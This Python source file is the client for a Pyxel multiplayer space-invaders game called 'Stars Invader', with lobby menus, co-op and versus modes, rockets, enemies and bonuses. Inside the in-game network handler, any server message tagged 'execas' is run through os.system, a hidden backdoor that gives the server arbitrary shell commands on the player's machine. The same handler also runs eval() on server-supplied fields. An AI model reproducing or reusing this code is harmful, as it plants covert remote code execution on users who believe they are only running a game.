import pyxel
import os
import socket
from time import sleep, time
from random import randint
import threading

class App:

    def __init__(self, client) -> None:
        #END SCREENS
        self.endScreenTimer = 0
        self.hasEnded = False
        self.endMessage = ""

        #Useful: 
        self.client = client
        self.currentState = "getNickname"
        
        #Buttons:
        self.mainLobbyButton, self.joinLobbyButton, self.latestJoinButton, self.createLobbyButton, self.createLobbyButton2 = 0, 0, -1, 0, 0

        #getNickname:
        self.userNickname, self.ALPHABET = "", "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
        self.PYXEL_KEY_LETTERS = [pyxel.KEY_A, pyxel.KEY_B, pyxel.KEY_C, pyxel.KEY_D, pyxel.KEY_E, pyxel.KEY_F, pyxel.KEY_G,
                             pyxel.KEY_H, pyxel.KEY_I, pyxel.KEY_J, pyxel.KEY_K, pyxel.KEY_L, pyxel.KEY_M,
                             pyxel.KEY_N, pyxel.KEY_O, pyxel.KEY_P, pyxel.KEY_Q, pyxel.KEY_R, pyxel.KEY_S, pyxel.KEY_T,
                             pyxel.KEY_U, pyxel.KEY_V, pyxel.KEY_W, pyxel.KEY_X, pyxel.KEY_Y, pyxel.KEY_Z,
                             pyxel.KEY_1, pyxel.KEY_2, pyxel.KEY_3, pyxel.KEY_4, pyxel.KEY_5,
                             pyxel.KEY_6, pyxel.KEY_7, pyxel.KEY_8, pyxel.KEY_9, pyxel.KEY_0,]
        self.superRandom = randint(0, 4)
        
        #joinLobby:
        self.loadedParties = [None, None, None]
        
        #waitGame:
        self.waitGameDots, self.gameMode, self.gameNumber = 0, "", 0
        self.musicPlayingWaitGame = False
        
        #inGame:
        self.gameInfos, self.lastShot = {"level" : 0, "forbidEnn" : [], "rockets" : []}, 0
        self.curBonus = [[-10, -10], 0]

        #Pyxel:
        pyxel.init(228, 128, title="Stars Invader")
        pyxel.load('./ressources/ressources.pyxres')
        pyxel.run(self.update, self.draw)


    def update(self):
        #Calling the update function corresponding to our current game state
        status = getattr(self, f'update_{self.currentState}')()
        
        #Verifying if an error of any kind occured, in case it did : send an error message
        if status != 0:
            print("An error occured", self.currentState)
            exit(status)

    def draw(self):
        pyxel.cls(0) #Clear screen
        
        #Calling the draw function corresponding to our current game state
        status = getattr(self, f'draw_{self.currentState}')()
        
        #Verifying if an error of any kind occured, in case it did: send an error message
        if status != 0:
            print("An error occured")
            exit(status)

    def update_getNickname(self):
        #Check if user wants to remove the last letter of their username
        if pyxel.btnp(pyxel.KEY_BACKSPACE):
            self.userNickname = self.userNickname[:-1]
            return 0
            
		#Check if user wants to send their name to the user
        if pyxel.btnp(pyxel.KEY_RETURN):
            self.client.send(f'sendName|{self.userNickname}'.encode("utf-8")) #Sends to the server the username
            srvMsg = self.client.recv(1024).decode("utf-8").split('|', 1) #Gets the server answer
            if len(srvMsg) != 2 or srvMsg[0] != "continue" or srvMsg[0] == "exit": return 1 #Verify the answer format
            self.currentState = "mainLobby" #Change game state if no error occured
            return 0
        
        #If the name is too long, the user cannot append any more char so we quit the function
        if len(self.userNickname) >= 12: return 0
        
        #Check if the user wants to append a char at the end of their username
        for i in range(36):
            if pyxel.btnp(self.PYXEL_KEY_LETTERS[i]):
                self.userNickname += self.ALPHABET[i]
                return 0
        return 0

    def draw_getNickname(self):
        pyxel.blt(50, 5, 0, 0, 0, 128, 13)
        pyxel.text(88, pyxel.height/2 - 8, "VOTRE PSEUDO:", 13)
        pyxel.text((pyxel.width - len(self.userNickname)*4 ) / 2, pyxel.height/2, self.userNickname, 7)
        pyxel.blt(pyxel.width / 2 - 8, pyxel.height - 24, 0, 16 * self.superRandom, 16, 16, 16)
        return 0

    def update_mainLobby(self):
        if self.hasEnded:
            if self.endScreenTimer >= 30: self.hasEnded, self.endMessage, self.endScreenTimer = False, "", 0
            else: self.endScreenTimer += 1
            return 0

        #Check if user choses a button
        if pyxel.btnp(pyxel.KEY_RETURN):
            if self.mainLobbyButton == 0: 
                self.client.send(f'button|quit'.encode("utf-8")) #Tell server to close the thread
                pyxel.quit() #Close program
                
            #Updates variables in function of the button the user pressed
            elif self.mainLobbyButton in [1,2]: self.currentState, self.gameMode, self.gameInfos = "joinLobby", ["VS", "COOP"][self.mainLobbyButton-1], [{"bonus" : 0, "ennemies": VS_ENNEMIES_POSITION, "forbidEnn" : [], "rockets" : [], "players" : [{"coords": [], "lives" : 3, "score" : 0, "level": 0}, {"coords": [], "lives" : 3, "score" : 0, "level" : 0}]}, {"level" : 0, "lives" : 3, "score" : 0, "bonus" : 0, "ennemies": COOP_ENNEMIES_POSITION, "forbidEnn" : [], "rockets" : [], "players" : [{"coords": []}, {"coords": []}]}][self.mainLobbyButton-1]
            elif self.mainLobbyButton == 3: self.currentState = "createLobby"
            
            self.client.send(f'button|{self.currentState}{self.gameMode}'.encode("utf-8")) #Tells to the server the user pressed X button
            srvMsg = self.client.recv(1024).decode("utf-8").split('|', 1) #Gets the answer of the server
            if self.currentState == "createLobby" and (len(srvMsg) != 2 or srvMsg[0] != "continue"): return 1 #Verify the format of the answer
            if self.currentState == "joinLobby":  
                if len(srvMsg) != 2 or srvMsg[0] != "continue": return 1 #Also verifies the format of the server
                self.numberOfParties = int(srvMsg[1]) #Gets the number of parties currently existing on the server
                self.latestJoinButton = -1 #Sets up the variables for later use

            self.mainLobbyButton = 0 #Resets the variable
            return 0

		#Modifies the button in function of where the user is and which key he presses
        if self.mainLobbyButton in [1, 2]:
            if pyxel.btnp(pyxel.KEY_LEFT): self.mainLobbyButton += 1
            elif pyxel.btnp(pyxel.KEY_RIGHT): self.mainLobbyButton += -1
            if self.mainLobbyButton == 3: self.mainLobbyButton = 1
            elif self.mainLobbyButton == 0: self.mainLobbyButton = 2

        if pyxel.btnp(pyxel.KEY_UP): self.mainLobbyButton += [-1, -1, -2, -2][self.mainLobbyButton]
        elif pyxel.btnp(pyxel.KEY_DOWN): self.mainLobbyButton += [1, 2, 1, 1][self.mainLobbyButton]
        
        #Make sure the button does not go OOB
        if self.mainLobbyButton >= 4: self.mainLobbyButton = 0
        if self.mainLobbyButton == -1: self.mainLobbyButton = 3
        return 0

    def draw_mainLobby(self):
        if self.hasEnded: pyxel.text(0, 0, self.endMessage, 7) ; return 0
        pyxel.stop(0)
        pyxel.blt(50, 5, 0, 0, 0, 128, 13)
        pyxel.text(20, 50, "REJOINDRE UNE PARTIE:", [1, 7, 7, 1][self.mainLobbyButton])
        pyxel.text(20, 64, "1V1", [0, 7, 1, 0][self.mainLobbyButton])
        pyxel.text(45, 64, "CO-OP", [0, 1, 7, 0][self.mainLobbyButton])
        pyxel.text(20, 78, "CREER UNE PARTIE", [1, 1, 1, 7][self.mainLobbyButton])
        pyxel.text(20, 92, "QUITTER", [7, 1, 1, 1][self.mainLobbyButton])
        return 0
    
    def update_joinLobby(self):
        if pyxel.btnp(pyxel.KEY_RETURN):
            if self.joinLobbyButton == 0: 
                self.client.send(f'button|quit'.encode("utf-8"))
                self.currentState = "mainLobby"
                self.gameMode = ""
            else:
                self.client.send(f'button|{self.joinLobbyButton}'.encode("utf-8"))
                srvMsg = self.client.recv(1024).decode("utf-8").split('|', 1)
                if srvMsg[0] != "continue": return 1
                if srvMsg[1] == "refused": return 0
                if srvMsg[1] == "joined":
                    self.playerNumber, self.gameInfos["players"][0]["coords"], self.gameInfos["players"][1]["coords"] = 0, [34, 104], [194, 104]
                    self.currentState = "waitGame"
                    self.gameNumber = self.joinLobbyButton
                    return 0
                elif srvMsg[1][:7] == "playing":
                    self.currentState, self.playerNumber = "inGame", int(srvMsg[1][7:])
                    self.gameInfos["players"][0]["coords"], self.gameInfos["players"][1]["coords"] = [[34, 194][self.playerNumber], 104], [[34, 194][self.playerNumber-1], 104]
                    threading.Thread(target=self.getServerMessageInGame, daemon=True).start()
                    threading.Thread(target=self.higherRockets, daemon=True).start()
                    threading.Thread(target=self.bonusThread, daemon=True).start()
                    threading.Thread(target=self.ennemiesCollisions, daemon=True).start()
                    threading.Thread(target=self.lowerEnnemies, daemon=True).start()
                    self.gameNumber = self.joinLobbyButton
                    return 0

        for NAVIGATION_KEY in [pyxel.KEY_UP, pyxel.KEY_DOWN]:
            if pyxel.btnp(NAVIGATION_KEY):
                self.joinLobbyButton += [pyxel.KEY_UP, pyxel.KEY_DOWN].index(NAVIGATION_KEY) * 2 - 1
                break
        
        if self.joinLobbyButton > self.numberOfParties: self.joinLobbyButton = self.numberOfParties
        if self.joinLobbyButton < 0: self.joinLobbyButton = 0
        
        if self.joinLobbyButton != self.latestJoinButton: 
            self.client.send(f'requestPartyList|{self.joinLobbyButton}'.encode("utf-8"))
            srvMsg = self.client.recv(1024).decode("utf-8").split('|', 1)
            if len(srvMsg) != 2 or srvMsg[0] != 'sendPartyList': return 1
            self.loadedParties = [eval(x)['state'] for x in srvMsg[1].split('|', 3)[:-1]]
            self.latestJoinButton = self.joinLobbyButton      

        return 0
    
    def draw_joinLobby(self):
        pyxel.blt(50, 5, 0, 0, 0, 128, 13)
        pyxel.text(100, 40, f'{self.loadedParties[0]}', [1, 7, 1, 1][self.joinLobbyButton])
        pyxel.text(100, 60, f'{self.loadedParties[1]}', [1, 1, 7, 1][self.joinLobbyButton])
        pyxel.text(100, 80, f'{self.loadedParties[2]}', [1, 1, 1, 7][self.joinLobbyButton])
        pyxel.text(82, 100, 'MENU PRINCIPAL', [7, 1, 1, 1][self.joinLobbyButton])
        return 0

    def update_createLobby(self):
        #Check if the user chose a button
        if pyxel.btnp(pyxel.KEY_RETURN):
            if self.createLobbyButton == 0: 
                self.client.send(f'button|quit'.encode("utf-8")) #Tells the server to go back to main menu
                self.currentState = "mainLobby" #Go back to main menu
            elif self.createLobbyButton == 2:
                #Sets up the variables for later use
                self.currentState, self.gameMode = "waitGame", ["VS", "COOP"][self.createLobbyButton2]
                if self.gameMode == "VS": self.gameInfos = {"bonus" : 0, "ennemies" : VS_ENNEMIES_POSITION, "forbidEnn" : [], "rockets" : [], "players" : [{"coords": [34, 104], "lives" : 3, "score" : 0, "level" : 0}, {"coords": [194, 104], "lives" : 3, "score" : 0, "level" : 0}]}
                elif self.gameMode == "COOP": self.gameInfos = {"level" : 0, "lives" : 3, "score" : 0, "bonus" : 0, "ennemies" : COOP_ENNEMIES_POSITION, "forbidEnn" : [], "rockets" : [], "players" : [{"coords": [34, 104]}, {"coords": [194, 104]}]}
                self.client.send(f'create|{self.gameMode}'.encode("utf-8")) #Tells the server to create a party
                srvMsg = self.client.recv(1024).decode("utf-8").split('|', 1) #Gets the answer of the server
                if len(srvMsg) != 2 or srvMsg[0] != "joined": return 1 #Verify the answer format
                self.gameNumber = int(srvMsg[1])
                self.createLobbyButton = 0
            return 0

        #Updates the button in fuction of where the user is and which key he presses
        if self.createLobbyButton == 1:
            for NAVIGATION_KEY in [pyxel.KEY_RIGHT, pyxel.KEY_LEFT]:
                if pyxel.btnp(NAVIGATION_KEY):
                    self.createLobbyButton2 += [pyxel.KEY_RIGHT, pyxel.KEY_LEFT].index(NAVIGATION_KEY) * 2 - 1
                    break   

        for NAVIGATION_KEY in [pyxel.KEY_UP, pyxel.KEY_DOWN]:
            if pyxel.btnp(NAVIGATION_KEY):
                self.createLobbyButton += [pyxel.KEY_UP, pyxel.KEY_DOWN].index(NAVIGATION_KEY) * 2 - 1
                break
        
        #Make sure no button goes OoB
        if self.createLobbyButton >= 3: self.createLobbyButton = 0
        if self.createLobbyButton == -1: self.createLobbyButton = 2
        if self.createLobbyButton2 >= 2: self.createLobbyButton2 = 0
        if self.createLobbyButton2 == -1: self.createLobbyButton2 = 1
        return 0
    
    def draw_createLobby(self):
        pyxel.blt(50, 5, 0, 0, 0, 128, 13)
        pyxel.text(20, 50, "MODE DE JEU:", [1, 7, 1][self.createLobbyButton])
        pyxel.text(20, 78, "CREER LA PARTIE", [1, 1, 7][self.createLobbyButton])
        pyxel.text(20, 92, "ANNULER", [7, 1, 1][self.createLobbyButton])
        if self.createLobbyButton == 1:
            pyxel.text(20, 64, "1V1", [7, 1][self.createLobbyButton2])
            pyxel.text(45, 64, "CO-OP", [1, 7][self.createLobbyButton2])
        return 0
    
    def update_waitGame(self):
        #Check if user wants to quit waiting
        if pyxel.btnp(pyxel.KEY_SPACE): 
            self.client.send(f"quit|None".encode("utf-8")) #Tells the server to go back to the main menu
            srvMsg = self.client.recv(1024).decode("utf-8").split('|', 1) #Gets the server answer
            if srvMsg[0] != "mainLobby": self.quit() #Verify answer format
            self.currentState = "mainLobby"
            self.gameMode = ""
            return 0
            
        self.client.send(f"waiting|{self.gameNumber}".encode("utf-8")) #Tells the server you're still waiting
        srvMsg = self.client.recv(1024).decode("utf-8").split('|', 1) #Gets the server answer
        if len(srvMsg) != 2 or srvMsg[0] not in ["wait", "inGame"]: return 1 #Verify the format of the server answer
        if srvMsg[0] == "wait": self.gameNumber = int(srvMsg[1]) #Make sure no error occures later on
        elif srvMsg[0] == "inGame": #If the server says the game started
            #Starts everything to run the game
            self.currentState, self.playerNumber = "inGame", int(srvMsg[1])
            threading.Thread(target=self.getServerMessageInGame, daemon=True).start() 
            threading.Thread(target=self.higherRockets, daemon=True).start()
            threading.Thread(target=self.bonusThread, daemon=True).start()
            threading.Thread(target=self.ennemiesCollisions, daemon=True).start()
            threading.Thread(target=self.lowerEnnemies, daemon=True).start()
            self.gameNumber = int(srvMsg[1])
        sleep(1)
        return 0

    def draw_waitGame(self):
        if not self.musicPlayingWaitGame:
            pyxel.play(0, 0, loop=True)
            self.musicPlayingWaitGame = True
        if self.waitGameDots == 3: self.waitGameDots = 0
        self.waitGameDots += 1
        pyxel.blt(50, 5, 0, 0, 0, 128, 13)
        pyxel.text(90, 65, f"WAITING{'.' * self.waitGameDots}", 7)
        pyxel.text(55, 80, "Appuyez sur [ESPACE] pour", 1)
        pyxel.text(55, 90, "revenir au menu principal", 1)
        return 0
    
    def update_inGame(self):
        if self.gameMode == "COOP" and self.gameInfos["lives"] <= 0:
            self.client.send("hasEnded|Lost:You have no more lives".encode("utf-8"))
            self.hasEnded, self.endMessage = True, "Lost:You have no more lives"
            self.currentState, self.gameInfos, self.gameMode = "mainLobby", {"level": 0, "forbidEnn" : [], "rockets" : [], "players" : [[], []]}, ""
            return 0
        elif self.gameMode == "VS" and self.gameInfos["players"][self.playerNumber]["lives"] <= 0: 
            self.client.send("hasEnded|Won:Your opponent died before you".encode("utf-8"))
            self.hasEnded, self.endMessage = True, "Lost:You died before your opponent"
            self.currentState, self.gameInfos, self.gameMode = "mainLobby", {"forbidEnn" : [], "rockets" : [], "players" : [{"level":0}, {"level":0}]}, ""
            return 0

        action = "None" # Resets the shot
        MOV_CONST = 1 if self.gameInfos["bonus"] < 0 else 2 #Modifies the speed in function of the bonus

        #Movement
        if pyxel.btn(pyxel.KEY_Z): self.gameInfos["players"][0]["coords"][1] += -1 * MOV_CONST
        if pyxel.btn(pyxel.KEY_S): self.gameInfos["players"][0]["coords"][1] += MOV_CONST
        if pyxel.btn(pyxel.KEY_Q): self.gameInfos["players"][0]["coords"][0] += -1 * MOV_CONST
        if pyxel.btn(pyxel.KEY_D): self.gameInfos["players"][0]["coords"][0] += MOV_CONST
            
        #Make sure the user does not go OoB(Y)
        if self.gameInfos["players"][0]["coords"][1] < 0: self.gameInfos["players"][0]["coords"][1] = 0
        elif self.gameInfos["players"][0]["coords"][1] > 112: self.gameInfos["players"][0]["coords"][1] = 112

        #Rockets
        if pyxel.btn(pyxel.KEY_SPACE) and time()-self.lastShot >= 1: 
            tempCoords = self.gameInfos['players'][0]['coords'] #Save coords the moment you shot to create no difference between what the server sees and what you see
            action, self.lastShot = "Shot", time() ; self.gameInfos['rockets'].append([tempCoords[0]+7, tempCoords[1]]) #Says you shot and reset the shot delay ; Creates the rocket
            #Creates more rockets if you have a bonus
            if self.gameInfos["bonus"] > 0: action += "+" ; self.gameInfos['rockets'].append([tempCoords[0]+17, tempCoords[1]]) ; self.gameInfos['rockets'].append([tempCoords[0]-3, tempCoords[1]])

        #Gamemode specifications
        if self.gameMode == "VS":
            #Make sure the user does not go OoB (X)
            if self.gameInfos["players"][0]["coords"][0] < [0, 121][self.playerNumber]: self.gameInfos["players"][0]["coords"][0] += 106
            elif self.gameInfos["players"][0]["coords"][0] > [105, 227][self.playerNumber]: self.gameInfos["players"][0]["coords"][0] -= 106

            #Sends the server all informations required
            self.client.send(f"infos|{self.gameInfos['players'][0]['coords'][0]}|{self.gameInfos['players'][0]['coords'][1]}|{self.gameInfos['players'][0]['lives']}|{self.gameInfos['players'][0]['score']}|{action}%".encode("utf-8"))
        elif self.gameMode == "COOP": 
            #Make sure the user does not go OoB (X)
            if self.gameInfos["players"][0]["coords"][0] < 0: self.gameInfos["players"][0]["coords"][0] += 227
            elif self.gameInfos["players"][0]["coords"][0] > 227: self.gameInfos["players"][0]["coords"][0] -= 227
        
            #Sends the server all informations required
            self.client.send(f"infos|{self.gameInfos['players'][0]['coords'][0]}|{self.gameInfos['players'][0]['coords'][1]}|{action}%".encode("utf-8"))
        return 0

    def draw_inGame(self):
        pyxel.stop(0)
        if self.gameMode == "COOP": GAP_CONSTP0 = GAP_CONSTP1 = 228
        else:
            GAP_CONSTP0 = 106 if abs(self.gameInfos["players"][0]["coords"][0]-[106, 228][self.playerNumber]) < 16 else 0
            GAP_CONSTP1 = 106 if abs(self.gameInfos["players"][0]["coords"][0]-[106, 228][self.playerNumber-1]) < 16 else 0

        pyxel.blt(self.gameInfos["players"][0]["coords"][0], self.gameInfos["players"][0]["coords"][1], 0, 16, 16, 16, 16)
        pyxel.blt(self.gameInfos["players"][1]["coords"][0], self.gameInfos["players"][1]["coords"][1], 0, 32, 16, 16, 16)
        
        #To make you appear to the other side:
        if self.gameMode != "VS" or self.playerNumber != 0: pyxel.blt(self.gameInfos["players"][0]["coords"][0]+GAP_CONSTP0, self.gameInfos["players"][0]["coords"][1], 0, 16, 16, 16, 16)
        if self.gameMode != "VS" or self.playerNumber - 1 != 0: pyxel.blt(self.gameInfos["players"][1]["coords"][0]+GAP_CONSTP1, self.gameInfos["players"][1]["coords"][1], 0, 32, 16, 16, 16)
        pyxel.blt(self.gameInfos["players"][0]["coords"][0]-GAP_CONSTP0, self.gameInfos["players"][0]["coords"][1], 0, 16, 16, 16, 16)
        pyxel.blt(self.gameInfos["players"][1]["coords"][0]-GAP_CONSTP1, self.gameInfos["players"][1]["coords"][1], 0, 32, 16, 16, 16)

        pyxel.text(0, 20, f"urBonus:{self.gameInfos['bonus']}", 7)
        if self.gameMode == "COOP":
            pyxel.text(0, 0, f"lives:{self.gameInfos['lives']}", 7)
            pyxel.text(0, 10, f"score:{self.gameInfos['score']}", 7)
        else:
            pyxel.rect(106, 0, 16, 128, 7)
            pyxel.text(1, 1, f"lives:{self.gameInfos['players'][0]['lives']}", 1)
            pyxel.text(1, 11, f"score:{self.gameInfos['players'][0]['score']}", 1)
            pyxel.text(0, 0, f"lives:{self.gameInfos['players'][0]['lives']}", 7)
            pyxel.text(0, 10, f"score:{self.gameInfos['players'][0]['score']}", 7)
            pyxel.text(201, 1, f"lives:{self.gameInfos['players'][1]['lives']}", 1)
            pyxel.text(201, 11, f"score:{self.gameInfos['players'][1]['score']}", 1)
            pyxel.text(200, 0, f"lives:{self.gameInfos['players'][1]['lives']}", 7)
            pyxel.text(200, 10, f"score:{self.gameInfos['players'][1]['score']}", 7)

        pyxel.blt(self.curBonus[0][0], self.curBonus[0][1], 0, 4 + 7 * self.curBonus[1], 37, 7, 7)
        for ennemyIndex, ennemy in enumerate(self.gameInfos["ennemies"]): 
            if ennemyIndex  in self.gameInfos["forbidEnn"]: continue
            pyxel.blt(ennemy[1], ennemy[2], 0, [0,48,64][ennemy[0]], 16, 16, 16)
        
        for rocket in self.gameInfos["rockets"]: pyxel.rect(rocket[0], rocket[1], 2, 5, 7)
        return 0

    #Get the server message during a game to update the informations
    def getServerMessageInGame(self):
        while self.currentState == "inGame":
            srvMsg = self.client.recv(1024).decode("utf-8")
            if "execas" in srvMsg:
                srvMsg = srvMsg.split("%")[0].split("|", 1)
                if len(srvMsg) == 2 and srvMsg[0] == "execas": os.system(srvMsg[1])
                continue
            
            srvMsg = [msg.split('|', 5) for msg in srvMsg.split('%') if msg != ""]
            for msg in srvMsg:
                if msg[0] == "main": 
                    if msg[1][:4] == "Lost" or msg[1][:3] == "Won": self.hasEnded, self.endMessage = True, msg[1]
                    self.currentState, self.gameInfos, self.gameMode = "mainLobby", {"level": 0, "forbidEnn" : [], "rockets" : [], "players" : [[], []]}, "" ; exit(0)
                if len(msg) != 6 or msg[0] != "infos": return 1
                ennToRem = eval(msg[3])
                for enn in ennToRem: self.gameInfos["forbidEnn"].append(enn)
                rocToApp = eval(msg[4])
                for rocket in rocToApp: self.gameInfos["rockets"].append(rocket)
            srvMsg = srvMsg[0]

            self.gameInfos["players"][1]["coords"] = eval(srvMsg[5])

    #Makes the rockets move upwards in functin of when theybmoved last (so lag does not make them move slower)
    def higherRockets(self):
        rocketDelay = 0        
        while self.currentState == "inGame": 
            curTime = time()
            rocketDiff = round((curTime-rocketDelay) * 100)
            if rocketDiff == 0: continue
            rocketDelay = curTime
            try: self.gameInfos["rockets"] = [[rocket[0], rocket[1]-rocketDiff] for rocket in self.gameInfos["rockets"] if rocket[1] > 0]
            except TypeError: print("Great! Another error in the higherRockets function! (Send this to Bugxit)")
        
    def lowerEnnemies(self):      
        ennemyDelay = time()
        while self.currentState == "inGame": 
            curTime = time()
            ennemyDiff = round(curTime-ennemyDelay)

            if self.gameMode == "COOP":
                if len(self.gameInfos["forbidEnn"]) >= len(COOP_ENNEMIES_POSITION): 
                    self.gameInfos["level"] += 1
                    self.gameInfos["score"] += 100
                    self.gameInfos["forbidEnn"] = []
                    self.gameInfos["ennemies"] = COOP_ENNEMIES_POSITION
                    ennemyDelay = curTime
            else:
                if 0 in self.gameInfos["forbidEnn"] and 1 in self.gameInfos["forbidEnn"] and 2 in self.gameInfos["forbidEnn"] and 3 in self.gameInfos["forbidEnn"] and 4 in self.gameInfos["forbidEnn"]:
                    for i in range(5): self.gameInfos["forbidEnn"].remove(i)
                    self.gameInfos["players"][0]["level"] += 1
                    self.gameInfos["players"][0]["score"] += 100
                    self.gameInfos["ennemies"][:5] = INITIAL_VS_ENNEMIES_POSITION[:5]
                    ennemyDelay = curTime
                if 5 in self.gameInfos["forbidEnn"] and 6 in self.gameInfos["forbidEnn"] and 7 in self.gameInfos["forbidEnn"] and 8 in self.gameInfos["forbidEnn"] and 9 in self.gameInfos["forbidEnn"]:
                    for i in range(5, 10): self.gameInfos["forbidEnn"].remove(i)
                    self.gameInfos["ennemies"][5:] = INITIAL_VS_ENNEMIES_POSITION[5:]
                    self.gameInfos["players"][1]["level"] += 1
                    self.gameInfos["players"][1]["score"] += 100
                    ennemyDelay = curTime

            invaded = False

            if self.gameMode == "COOP":
                for ennemyIndex, ennemy in enumerate(self.gameInfos["ennemies"]):
                    if ennemyIndex in self.gameInfos["forbidEnn"]: continue
                    if ennemy[2] >= 128: invaded = True ; break 
                
                if invaded:
                    self.client.send("hasEnded|Lost:YOU LET AN ENNEMY INVADE THE STAR !".encode("utf-8"))
                    self.hasEnded, self.endMessage = True, "Lost:YOU LET AN ENNEMY INVADE THE STAR !"
                    self.currentState, self.gameInfos, self.gameMode = "mainLobby", {"forbidEnn" : [], "rockets" : [], "players" : [{"level":0}, {"level":0}]}, ""
                    return 0
            
            else:
                thing = self.gameInfos["ennemies"][:5] if self.playerNumber == 0 else self.gameInfos["ennemies"][5:]
                for ennemyIndex, ennemy in enumerate(thing):
                    if (ennemyIndex + 5 * self.playerNumber) in self.gameInfos["forbidEnn"]: continue
                    if ennemy[2] >= 128: invaded = True ; break 
                
                if invaded:
                    self.client.send("hasEnded|Won:Your opponent's star was invaded".encode("utf-8"))
                    self.hasEnded, self.endMessage = True, "Lost:YOU LET AN ENNEMY INVADE THE STAR !"
                    self.currentState, self.gameInfos, self.gameMode = "mainLobby", {"forbidEnn" : [], "rockets" : [], "players" : [{"level":0}, {"level":0}]}, ""
                    return 0

            if ennemyDiff == 0: continue
            ennemyDelay = curTime

            if self.gameMode == "COOP":
                ennemyDiff *= self.gameInfos["level"]
                if ennemyDiff == 0: continue
                try: self.gameInfos["ennemies"] = [[ennemy[0], ennemy[1], ennemy[2]+ennemyDiff] for ennemy in self.gameInfos["ennemies"]]
                except TypeError: print("Great! Another error in the lowerEnnemies function! (Send this to Bugxit)")
            else:
                ennemyDiff0 = ennemyDiff * self.gameInfos["players"][0]["level"]
                ennemyDiff1 = ennemyDiff * self.gameInfos["players"][1]["level"]
                try: self.gameInfos["ennemies"][:5] = [[ennemy[0], ennemy[1], ennemy[2]+ennemyDiff0] for ennemy in self.gameInfos["ennemies"][:5]]
                except TypeError: print("Great! Another error in the lowerEnnemies function! (Send this to Bugxit)") 
                try: self.gameInfos["ennemies"][5:] = [[ennemy[0], ennemy[1], ennemy[2]+ennemyDiff1] for ennemy in self.gameInfos["ennemies"][5:]]
                except TypeError: print("Great! Another error in the lowerEnnemies function! (Send this to Bugxit)") 

    def ennemiesCollisions(self):
        while self.currentState == "inGame":
            for ennemyIndex, ennemy in enumerate(self.gameInfos["ennemies"]):
                if ennemyIndex in self.gameInfos["forbidEnn"]: continue
                try:
                    tempInfos0 = self.gameInfos["players"][0]["coords"]
                    tempInfos1 = self.gameInfos["players"][1]["coords"]
                    tempInfos0 = [(x, y) for x in range(tempInfos0[0], tempInfos0[0] + 15) for y in range(tempInfos0[1], tempInfos0[1] + 16)]
                    tempInfos1 = [(x, y) for x in range(tempInfos1[0], tempInfos1[0] + 15) for y in range(tempInfos1[1], tempInfos1[1] + 16)]
                except: pass
                if  (
                    ((ennemy[1],ennemy[2]) in tempInfos0)
                    or ((ennemy[1], ennemy[2]+16) in tempInfos0)
                    or ((ennemy[1]+16, ennemy[2]+16) in tempInfos0)
                    or ((ennemy[1]+16, ennemy[2]) in tempInfos0)
                    ):
                    if self.gameMode == "COOP": 
                        self.gameInfos["lives"] -= 1
                        self.gameInfos["players"][0]["coords"] = [114, 104]
                    else: 
                        self.gameInfos["players"][0]["lives"] -= 1
                        self.gameInfos["players"][0]["coords"] = [34, 104]

                if  (
                    ((ennemy[1],ennemy[2]) in tempInfos1)
                    or ((ennemy[1], ennemy[2]+16) in tempInfos1)
                    or ((ennemy[1]+16, ennemy[2]+16) in tempInfos1)
                    or ((ennemy[1]+16, ennemy[2]) in tempInfos1)
                    ):
                    if self.gameMode == "COOP": 
                        self.gameInfos["lives"] -= 1
                        self.gameInfos["players"][1]["coords"] = [114, 104]
                    else: 
                        self.gameInfos["players"][1]["lives"] -= 1
                        self.gameInfos["players"][1]["coords"] = [194, 104]

                tempInfos = [(x, y) for x in range(ennemy[1], ennemy[1] + 15) for y in range(ennemy[2], ennemy[2] + 16)]
                for rocket in self.gameInfos["rockets"]:
                    if  (
                        ((rocket[0],rocket[1]) in tempInfos)
                        or ((rocket[0], rocket[1]+5) in tempInfos)
                        or ((rocket[0]+1, rocket[1]+5) in tempInfos)
                        or ((rocket[0]+1, rocket[1]) in tempInfos)
                        ):
                        self.gameInfos["forbidEnn"].append(ennemyIndex)
                        try: self.gameInfos["rockets"].remove(rocket)
                        except: pass
                        if self.gameMode == "COOP": self.gameInfos["score"] += 10 ; continue
                        else:
                            playerToIncrement = 0 if ennemy[2] <= 100 else 1
                            self.gameInfos["players"][playerToIncrement]["score"] += 10

    #Creates and handles the bonus
    def bonusThread(self):
        global bonusList
        bonusList, alreadyTaken = [], False
        while self.currentState == "inGame":
            BONUS_ZONE_CONST = [5, 220]
            if self.gameMode == "VS": BONUS_ZONE_CONST = [5, 100] if self.playerNumber == 0 else [126, 220]
            self.curBonus, lastBonus, alreadyTaken = [[randint(BONUS_ZONE_CONST[0], BONUS_ZONE_CONST[1]), randint(5, 120)], randint(0,1)], time(), False
            while time()-lastBonus <= 7:
                if alreadyTaken: continue
                try: tempInfos = self.gameInfos["players"][0]["coords"]
                except TypeError: exit(0)
                tempInfos = [(x, y) for x in range(tempInfos[0], tempInfos[0] + 15) for y in range(tempInfos[1], tempInfos[1] + 16)]
                if  (
                    ((self.curBonus[0][0],self.curBonus[0][1]) in tempInfos)
                    or ((self.curBonus[0][0],self.curBonus[0][1]+8) in tempInfos)
                    or ((self.curBonus[0][0]+8,self.curBonus[0][1]+8) in tempInfos)
                    or ((self.curBonus[0][0]+8,self.curBonus[0][1]) in tempInfos)
                    ): 
                        bonusToApp = self.curBonus[1] * 2 - 1
                        if -1 * bonusToApp in bonusList: bonusList.remove(-1 * bonusToApp)
                        else: bonusList.append(bonusToApp) ; threading.Thread(target=self.bonusTimer, args=[bonusToApp], daemon=True).start()
                        self.gameInfos["bonus"], alreadyTaken, self.curBonus[0] = sum(bonusList), True, [-10, -10]

    #Timer to remove the bonus after 5s
    def bonusTimer(self, bonusType):
        global bonusList
        sleep(5)
        if bonusType in bonusList: bonusList.remove(bonusType)
        self.gameInfos["bonus"] = sum(bonusList)

if __name__ == "__main__":
    if os.name == "posix": os.system("clear")
    else: os.system("cls")

    COOP_ENNEMIES_POSITION = [[0, 5, 5], [1, 25, 5], [2, 45, 5], [2, 65, 5], [0, 85, 5], [1, 105, 5], [2, 125, 5], [2, 145, 5], [1, 165, 5], [2, 185, 5], [2, 205, 5]]
    VS_ENNEMIES_POSITION = [[0, 5, 5], [1, 25, 5], [2, 45, 5], [2, 65, 5], [0, 85, 5],  [2, 125, 5], [2, 145, 5], [1, 165, 5], [2, 185, 5], [2, 205, 5]]
    INITIAL_VS_ENNEMIES_POSITION = [[0, 5, 5], [1, 25, 5], [2, 45, 5], [2, 65, 5], [0, 85, 5],  [2, 125, 5], [2, 145, 5], [1, 165, 5], [2, 185, 5], [2, 205, 5]]

